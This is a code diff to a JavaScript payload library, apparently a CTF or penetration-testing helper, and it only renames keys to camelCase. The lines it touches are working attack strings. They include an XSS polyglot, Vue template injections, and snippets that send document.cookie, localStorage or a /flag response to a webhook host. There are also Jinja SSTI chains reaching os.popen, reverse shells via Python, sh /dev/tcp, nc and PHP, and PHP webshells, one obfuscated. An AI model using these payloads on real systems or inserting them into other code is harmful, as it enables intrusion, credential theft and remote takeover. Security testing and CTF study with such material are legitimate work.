@@ -176,16 +176,16 @@ window.Payload.XSS = {
   polyglot: value => "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
 
   Vue: {
-    vue2_1: value => "{{_c.constructor`alert()`()}}",
-    vue2_2: value => "<x/v-if=_c.constructor`alert()`()>",
-    vue3_1: value => "{{$emit.constructor`alert()`()}}",
-    vue3_2: value => "<component is=script text=alert()>"  
+    vue2Interpolation: value => "{{_c.constructor`alert()`()}}",
+    vue2Directive: value => "<x/v-if=_c.constructor`alert()`()>",
+    vue3Interpolation: value => "{{$emit.constructor`alert()`()}}",
+    vue3DynamicComponent: value => "<component is=script text=alert()>"  
   },
 
   snippets: {
-    get_samesite_flag: value => "fetch('/flag').then(t=>t.text()).then(t=>location='https://webhook/?f='+encodeURIComponent(t))",
-    get_cookie_flag: value => "location='https://webhook/?f='+encodeURIComponent(document.cookie)",
-    get_storage_flag: value => "location='https://webhook/?f='+encodeURIComponent(localStorage.flag)"
+    getSamesiteFlag: value => "fetch('/flag').then(t=>t.text()).then(t=>location='https://webhook/?f='+encodeURIComponent(t))",
+    getCookieFlag: value => "location='https://webhook/?f='+encodeURIComponent(document.cookie)",
+    getStorageFlag: value => "location='https://webhook/?f='+encodeURIComponent(localStorage.flag)"
   }
 }
 
@@ -198,11 +198,11 @@ window.Payload.SSTI = {
     tuple2AllSubclasses: value => '{{().__class__.__base__.__subclasses__()}}',
     tuple2RCE: value => "{%for(x)in().__class__.__base__.__subclasses__()%}{%if'war'in(x).__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}",
     g2RCE: value => "{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
-    url_for2RCE: value => "{{url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    urlFor2RCE: value => "{{url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
     application2RCE: value => "{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
     // config2RCE Reference: https://twitter.com/realgam3/status/1184747565415358469
     config2RCE: value => "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
-    add_url_rule: value => "{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}"
+    addUrlRule: value => "{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}"
     // TODO: add features to bypass filter keywords like __ '' "" []
   },
   Java: {
@@ -218,20 +218,20 @@ window.Payload.Shell = {
     py: value => `python -c 'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
   },
   sh: {
-    with_i: value => "sh -i >& /dev/tcp/RHOST/RPORT 0>&1",
-    without_i: value => "0<&196;exec 196<>/dev/tcp/RHOST/RPORT;sh <&196 >&196 2>&196"
+    withI: value => "sh -i >& /dev/tcp/RHOST/RPORT 0>&1",
+    withoutI: value => "0<&196;exec 196<>/dev/tcp/RHOST/RPORT;sh <&196 >&196 2>&196"
   },
   nc: {
-    with_e: value => 'nc -e /bin/sh RHOST RPORT',
-    with_c: value => "nc -c bash RHOST RPORT"
+    withE: value => 'nc -e /bin/sh RHOST RPORT',
+    withC: value => "nc -c bash RHOST RPORT"
   },
   php: {
-    reverse_shell: value => `php -r '$sock=fsockopen("RHOST",RPORT);exec("sh <&3 >&3 2>&3");'`,
-    webshell_eval: value => "<?=eval($_GET[_]);",
-    webshell_exec: value => "<?=exec($_GET[_]);",
-    webshell_system: value => "<?=system($_GET[_]);",
-    webshell_backquote: value => "<?=`$_GET[_]`;",
-    webshell_all_function: value => "<?=($_GET[ÿ])($_GET[_]);",
-    webshell_no_alphabets_digits: value => "<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);"
+    reverseShell: value => `php -r '$sock=fsockopen("RHOST",RPORT);exec("sh <&3 >&3 2>&3");'`,
+    webshellEval: value => "<?=eval($_GET[_]);",
+    webshellExec: value => "<?=exec($_GET[_]);",
+    webshellSystem: value => "<?=system($_GET[_]);",
+    webshellBackquote: value => "<?=`$_GET[_]`;",
+    webshellAllFunction: value => "<?=($_GET[ÿ])($_GET[_]);",
+    webshellNoAlphabetsDigits: value => "<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);"
   }
 }
